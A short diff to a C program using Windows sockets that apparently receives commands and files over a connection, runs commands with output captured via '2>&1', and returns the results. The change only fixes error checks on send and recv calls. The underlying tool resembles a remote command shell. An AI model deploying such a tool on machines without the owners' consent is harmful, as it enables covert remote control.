@@ -66,7 +66,7 @@ int recv_file(char* buf, char* filename, SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
 
 	// Receive file size.
-	if (!recv(connect_socket, buf, sizeof(uint32_t), 0))
+	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	// Serialize f_size.
@@ -105,7 +105,7 @@ int send_file(char* filename, SOCKET connect_socket, char* buf) {
 		fseek(fd, 0L, SEEK_SET);
 	}
 
-	if (!send(connect_socket, (char*)&bytes, sizeof(bytes), 0))
+	if (send(connect_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
 		return SOCKET_ERROR;
 
 	int iResult = 1;
@@ -166,7 +166,7 @@ int exec_cmd(SOCKET connect_socket, char* buf) {
 	uint32_t bytes = htonl(s_size);
 
 	// Send serialized bytes.
-	if (!send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0))
+	if (send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	int iResult = send(connect_socket, output, s_size, 0);
@@ -195,7 +195,7 @@ int main(void) {
 				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
 				char buf[BUFLEN + 5] = { 0 };
 
-				if (!recv(connect_socket, buf, BUFLEN, 0))
+				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
 					break;
 
 				// buf[0] is the command code and &buf[1] is the parsed data.
